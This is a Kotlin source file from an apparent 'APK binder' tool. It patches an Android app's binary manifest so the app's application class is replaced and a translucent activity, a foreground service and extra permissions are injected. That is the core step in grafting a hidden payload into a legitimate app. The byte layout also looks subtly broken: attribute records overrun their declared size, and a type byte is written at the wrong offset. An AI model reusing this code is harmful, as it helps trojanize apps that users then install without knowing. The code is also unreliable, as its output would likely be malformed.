package Com.devhs.apkbinder.binder

import java.io.ByteArrayOutputStream

object AxmlPatcher {

    private const val CHUNK_STRING_POOL = 0x0001
    private const val CHUNK_RESOURCE_MAP = 0x0180
    private const val CHUNK_START_ELEMENT = 0x0102
    private const val CHUNK_END_ELEMENT = 0x0103
    private const val FLAG_UTF8 = 0x100
    private const val TYPE_STRING = 0x03
    private const val TYPE_REFERENCE = 0x01
    private const val TYPE_INT_DEC = 0x10
    private const val ANDROID_NS = "http://schemas.android.com/apk/res/android"

    const val ATTR_NAME = 0x01010003
    const val ATTR_THEME = 0x01010000
    const val ATTR_FG_TYPE = 0x01010599
    const val STYLE_TRANSLUCENT = 0x0103000b

    sealed class Value {
        data class Str(val v: String) : Value()
        data class Ref(val v: Int) : Value()
        data class Dec(val v: Int) : Value()
    }

    class Attr(val name: String, val resId: Int, val value: Value)
    class Element(val name: String, val attrs: List<Attr>)

    fun patch(
        xml: ByteArray,
        newAppClass: String,
        activityClass: String,
        serviceClass: String,
        permissions: List<String>
    ): ByteArray {
        val extra = mutableListOf<String>()
        val attrIds = LinkedHashMap<String, Int>()

        fun addAttr(name: String, id: Int) {
            if (!extra.contains(name)) {
                extra.add(name)
                attrIds[name] = id
            }
        }
        addAttr("name", ATTR_NAME)
        addAttr("theme", ATTR_THEME)
        addAttr("foregroundServiceType", ATTR_FG_TYPE)
        listOf("activity", "service", "uses-permission").forEach { if (!extra.contains(it)) extra.add(it) }
        extra.add(newAppClass)
        extra.add(activityClass)
        extra.add(serviceClass)
        permissions.forEach { extra.add(it) }

        var out = rebuildStringPool(xml, extra, attrIds)
        out = setApplicationName(out, newAppClass)

        out = insertChildren(
            out,
            listOf(
                Element("activity", listOf(
                    Attr("name", ATTR_NAME, Value.Str(activityClass)),
                    Attr("theme", ATTR_THEME, Value.Ref(STYLE_TRANSLUCENT))
                )),
                Element("service", listOf(
                    Attr("name", ATTR_NAME, Value.Str(serviceClass)),
                    Attr("foregroundServiceType", ATTR_FG_TYPE, Value.Dec(1))
                ))
            )
        )

        out = insertBeforeApplication(
            out,
            permissions.map { Element("uses-permission", listOf(Attr("name", ATTR_NAME, Value.Str(it)))) }
        )
        return out
    }

    private class PoolInfo(
        val start: Int,
        val size: Int,
        val strings: List<String>,
        val flags: Int,
        val styleData: ByteArray,
        val styleOffsets: IntArray
    )

    private fun readPool(b: ByteArray, start: Int): PoolInfo {
        val headerSize = u16(b, start + 2)
        val size = i32(b, start + 4)
        val count = i32(b, start + 8)
        val styleCount = i32(b, start + 12)
        val flags = i32(b, start + 16)
        val stringsStart = i32(b, start + 20)
        val stylesStart = i32(b, start + 24)
        val utf8 = (flags and FLAG_UTF8) != 0
        val dataStart = start + stringsStart

        val strings = ArrayList<String>(count)
        for (i in 0 until count) {
            val off = i32(b, start + headerSize + i * 4)
            strings.add(if (utf8) decodeUtf8(b, dataStart + off) else decodeUtf16(b, dataStart + off))
        }
        val styleOffsets = IntArray(styleCount) { i32(b, start + headerSize + count * 4 + it * 4) }
        val styleData = if (styleCount > 0 && stylesStart > 0) b.copyOfRange(start + stylesStart, start + size) else ByteArray(0)
        return PoolInfo(start, size, strings, flags, styleData, styleOffsets)
    }

    private fun decodeUtf8(b: ByteArray, off: Int): String {
        var p = off
        val a = readVarint(b, p); p = a.second
        val len = readVarint(b, p); p = len.second
        return String(b, p, len.first, Charsets.UTF_8)
    }

    private fun decodeUtf16(b: ByteArray, off: Int): String {
        val len = readVarint(b, off)
        val sb = StringBuilder(len.first)
        for (i in 0 until len.first) sb.append(u16(b, len.second + i * 2).toChar())
        return sb.toString()
    }

    private fun readVarint(b: ByteArray, off: Int): Pair<Int, Int> {
        val first = b[off].toInt() and 0xFF
        return if (first and 0x80 != 0) {
            (((first and 0x7F) shl 8) or (b[off + 1].toInt() and 0xFF)) to off + 2
        } else first to off + 1
    }

    private fun writeVarint(out: ByteArrayOutputStream, v: Int) {
        if (v > 0x7F) {
            out.write(((v shr 8) or 0x80) and 0xFF)
            out.write(v and 0xFF)
        } else out.write(v)
    }

    private fun rebuildStringPool(xml: ByteArray, extra: List<String>, attrIds: Map<String, Int>): ByteArray {
        val pool = readPool(xml, 8)
        val all = pool.strings + extra
        val utf8 = (pool.flags and FLAG_UTF8) != 0

        val data = ByteArrayOutputStream()
        val offsets = IntArray(all.size)
        for ((i, s) in all.withIndex()) {
            while (data.size() % 4 != 0) data.write(0)
            offsets[i] = data.size()
            if (utf8) {
                writeVarint(data, s.length)
                val bytes = s.toByteArray(Charsets.UTF_8)
                writeVarint(data, bytes.size)
                data.write(bytes)
                data.write(0)
            } else {
                writeVarint(data, s.length)
                for (ch in s) {
                    data.write(ch.code and 0xFF)
                    data.write((ch.code shr 8) and 0xFF)
                }
                data.write(0); data.write(0)
            }
        }
        while (data.size() % 4 != 0) data.write(0)

        val headerSize = 28
        val styleCount = pool.styleOffsets.size
        val stringsStart = headerSize + all.size * 4 + styleCount * 4
        val stylesStart = if (styleCount > 0) stringsStart + data.size() else 0
        val chunkSize = stringsStart + data.size() + pool.styleData.size

        val poolOut = ByteArrayOutputStream()
        poolOut.writeU16(CHUNK_STRING_POOL)
        poolOut.writeU16(28)
        poolOut.writeI32(chunkSize)
        poolOut.writeI32(all.size)
        poolOut.writeI32(styleCount)
        poolOut.writeI32(pool.flags)
        poolOut.writeI32(stringsStart)
        poolOut.writeI32(stylesStart)
        offsets.forEach { poolOut.writeI32(it) }
        pool.styleOffsets.forEach { poolOut.writeI32(it) }
        poolOut.write(data.toByteArray())
        poolOut.write(pool.styleData)

        val result = ByteArrayOutputStream()
        result.write(xml, 0, 8)
        result.write(poolOut.toByteArray())
        result.write(xml, 8 + pool.size, xml.size - 8 - pool.size)
        val merged = result.toByteArray()
        putI32(merged, 4, merged.size)
        return extendResourceMap(merged, all.size, attrIds)
    }

    private fun extendResourceMap(xml: ByteArray, needed: Int, ids: Map<String, Int>): ByteArray {
        val pool = readPool(xml, 8)
        val pos = 8 + pool.size
        if (pos + 8 > xml.size) return xml
        if (u16(xml, pos) != CHUNK_RESOURCE_MAP) return xml

        val mapSize = i32(xml, pos + 4)
        val entries = (mapSize - 8) / 4
        val grow = (needed - entries).coerceAtLeast(0)

        val out = ByteArrayOutputStream()
        out.write(xml, 0, pos + mapSize)
        repeat(grow) { out.writeI32(0) }
        out.write(xml, pos + mapSize, xml.size - pos - mapSize)
        val result = out.toByteArray()

        putI32(result, pos + 4, mapSize + grow * 4)
        putI32(result, 4, result.size)

        ids.forEach { (name, id) ->
            val idx = pool.strings.indexOf(name)
            if (idx >= 0) putI32(result, pos + 8 + idx * 4, id)
        }
        return result
    }

    private fun findElement(xml: ByteArray, name: String): Int {
        val pool = readPool(xml, 8)
        var pos = 8
        while (pos + 8 <= xml.size) {
            val type = u16(xml, pos)
            val size = i32(xml, pos + 4)
            if (size <= 0) break
            if (type == CHUNK_START_ELEMENT) {
                val nameIdx = i32(xml, pos + 20)
                if (nameIdx in pool.strings.indices && pool.strings[nameIdx] == name) return pos
            }
            pos += size
        }
        return -1
    }

    private fun setApplicationName(xml: ByteArray, cls: String): ByteArray {
        val pos = findElement(xml, "application")
        require(pos >= 0) { "application element not found" }

        val pool = readPool(xml, 8)
        val nameIdx = pool.strings.indexOf("name")
        val nsIdx = pool.strings.indexOf(ANDROID_NS)
        val clsIdx = pool.strings.indexOf(cls)
        val count = u16(xml, pos + 28)
        val base = pos + 36

        for (i in 0 until count) {
            val a = base + i * 20
            if (i32(xml, a) == nsIdx && i32(xml, a + 4) == nameIdx) {
                putI32(xml, a + 8, clsIdx)
                putI32(xml, a + 12, 8)
                putI32(xml, a + 16, 0)
                xml[a + 18] = TYPE_STRING.toByte()
                putI32(xml, a + 16, clsIdx)
                return xml
            }
        }

        val attr = ByteArray(20)
        putI32(attr, 0, nsIdx)
        putI32(attr, 4, nameIdx)
        putI32(attr, 8, clsIdx)
        putI32(attr, 12, 8)
        attr[14] = TYPE_STRING.toByte()
        putI32(attr, 16, clsIdx)
        return insertAt(xml, base + count * 20, attr)
    }

    private fun insertChildren(xml: ByteArray, elements: List<Element>): ByteArray {
        val pos = findElement(xml, "application")
        require(pos >= 0) { "application element not found" }
        val count = u16(xml, pos + 28)
        val insertPos = pos + 36 + count * 20

        val pool = readPool(xml, 8)
        val nsIdx = pool.strings.indexOf(ANDROID_NS)

        val buf = ByteArrayOutputStream()
        elements.forEach { el ->
            val nameIdx = pool.strings.indexOf(el.name)
            buf.writeU16(CHUNK_START_ELEMENT)
            buf.writeU16(16)
            buf.writeI32(36 + el.attrs.size * 20)
            buf.writeI32(1)
            buf.writeI32(-1)
            buf.writeI32(-1)
            buf.writeI32(nameIdx)
            buf.writeU16(20)
            buf.writeU16(20)
            buf.writeU16(el.attrs.size)
            buf.writeU16(0)
            buf.writeU16(0)
            buf.writeU16(0)
            el.attrs.forEach { at ->
                buf.writeI32(nsIdx)
                buf.writeI32(pool.strings.indexOf(at.name))
                when (val v = at.value) {
                    is Value.Str -> {
                        val idx = pool.strings.indexOf(v.v)
                        buf.writeI32(idx); buf.writeI32(8)
                        buf.writeI32(0); buf.writeU16(TYPE_STRING); buf.writeI32(idx)
                    }
                    is Value.Ref -> {
                        buf.writeI32(-1); buf.writeI32(8)
                        buf.writeI32(0); buf.writeU16(TYPE_REFERENCE); buf.writeI32(v.v)
                    }
                    is Value.Dec -> {
                        buf.writeI32(-1); buf.writeI32(8)
                        buf.writeI32(0); buf.writeU16(TYPE_INT_DEC); buf.writeI32(v.v)
                    }
                }
            }
            buf.writeU16(CHUNK_END_ELEMENT)
            buf.writeU16(16)
            buf.writeI32(24)
            buf.writeI32(1)
            buf.writeI32(-1)
            buf.writeI32(-1)
            buf.writeI32(nameIdx)
        }

        val block = buf.toByteArray()
        val out = insertAt(xml, insertPos, block)
        val appPos = findElement(out, "application")
        putI32(out, appPos + 4, i32(out, appPos + 4) + block.size)
        return out
    }

    private fun insertBeforeApplication(xml: ByteArray, elements: List<Element>): ByteArray {
        val pos = findElement(xml, "application")
        if (pos < 0) return xml
        val pool = readPool(xml, 8)
        val elemIdx = pool.strings.indexOf("uses-permission")
        val nameIdx = pool.strings.indexOf("name")
        val nsIdx = pool.strings.indexOf(ANDROID_NS)

        val buf = ByteArrayOutputStream()
        elements.forEach { el ->
            val valueIdx = pool.strings.indexOf((el.attrs.first().value as Value.Str).v)
            buf.writeU16(CHUNK_START_ELEMENT)
            buf.writeU16(16)
            buf.writeI32(56)
            buf.writeI32(1)
            buf.writeI32(-1)
            buf.writeI32(-1)
            buf.writeI32(elemIdx)
            buf.writeU16(20)
            buf.writeU16(20)
            buf.writeU16(1)
            buf.writeU16(0)
            buf.writeU16(0)
            buf.writeU16(0)
            buf.writeI32(nsIdx)
            buf.writeI32(nameIdx)
            buf.writeI32(valueIdx)
            buf.writeI32(8)
            buf.writeI32(0)
            buf.writeU16(TYPE_STRING)
            buf.writeI32(valueIdx)
            buf.writeU16(CHUNK_END_ELEMENT)
            buf.writeU16(16)
            buf.writeI32(24)
            buf.writeI32(1)
            buf.writeI32(-1)
            buf.writeI32(-1)
            buf.writeI32(elemIdx)
        }
        return insertAt(xml, pos, buf.toByteArray())
    }

    private fun insertAt(xml: ByteArray, pos: Int, block: ByteArray): ByteArray {
        val out = ByteArrayOutputStream()
        out.write(xml, 0, pos)
        out.write(block)
        out.write(xml, pos, xml.size - pos)
        val result = out.toByteArray()
        putI32(result, 4, result.size)
        return result
    }

    private fun u16(b: ByteArray, o: Int) = (b[o].toInt() and 0xFF) or ((b[o + 1].toInt() and 0xFF) shl 8)

    private fun i32(b: ByteArray, o: Int) =
        (b[o].toInt() and 0xFF) or ((b[o + 1].toInt() and 0xFF) shl 8) or
            ((b[o + 2].toInt() and 0xFF) shl 16) or ((b[o + 3].toInt() and 0xFF) shl 24)

    private fun putI32(b: ByteArray, o: Int, v: Int) {
        b[o] = v.toByte()
        b[o + 1] = (v shr 8).toByte()
        b[o + 2] = (v shr 16).toByte()
        b[o + 3] = (v shr 24).toByte()
    }

    private fun ByteArrayOutputStream.writeU16(v: Int) {
        write(v and 0xFF)
        write((v shr 8) and 0xFF)
    }

    private fun ByteArrayOutputStream.writeI32(v: Int) {
        write(v and 0xFF)
        write((v shr 8) and 0xFF)
        write((v shr 16) and 0xFF)
        write((v shr 24) and 0xFF)
    }
}
